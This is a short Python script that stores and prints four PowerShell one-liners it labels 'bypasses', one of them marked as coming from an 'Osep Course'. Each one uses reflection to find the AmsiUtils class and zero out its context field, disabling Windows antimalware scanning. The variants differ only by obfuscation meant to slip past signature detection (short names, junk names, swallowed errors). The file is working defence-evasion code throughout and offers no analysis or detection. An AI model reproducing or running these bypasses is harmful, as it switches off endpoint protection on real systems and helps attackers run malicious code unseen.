#!/usr/bin/env python3

bypasses = [
    (
        "1. Osep Course",
        r'$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields(''NonPublic,Static'');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'
    ),
    (
        "2. Short Variables",
        r'$x=[Ref].Assembly.GetTypes();ForEach($y in $x){if($y.Name-like"*iUtils"){$z=$y}};$p=$z.GetFields("NonPublic,Static");ForEach($q in $p){if($q.Name-like"*Context"){$r=$q}};$s=$r.GetValue($null);[IntPtr]$t=$s;[Int32[]]$u=@(0);[System.Runtime.InteropServices.Marshal]::Copy($u,0,$t,1)'
    ),
    (
        "3. Heavy Junk Variables",
        r'$a1=[Ref].Assembly.GetTypes();$b2=$null;ForEach($c3 in $a1){if($c3.Name-like"*iUtils"){$b2=$c3}};$d4=$b2.GetFields("NonPublic,Static");$e5=$null;ForEach($f6 in $d4){if($f6.Name-like"*Context"){$e5=$f6}};$g7=$e5.GetValue($null);[IntPtr]$h8=$g7;[Int32[]]$i9=@(0);[System.Runtime.InteropServices.Marshal]::Copy($i9,0,$h8,1)'
    ),
    (
        "4. One-liner + Error Suppression",
        r'try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name-like"*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");foreach($e in $d){if($e.Name-like"*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}catch{}'
    )
]

for name, code in bypasses:
    print(f"{name}")
    print(f"   {code}")
    print("-" * 60)
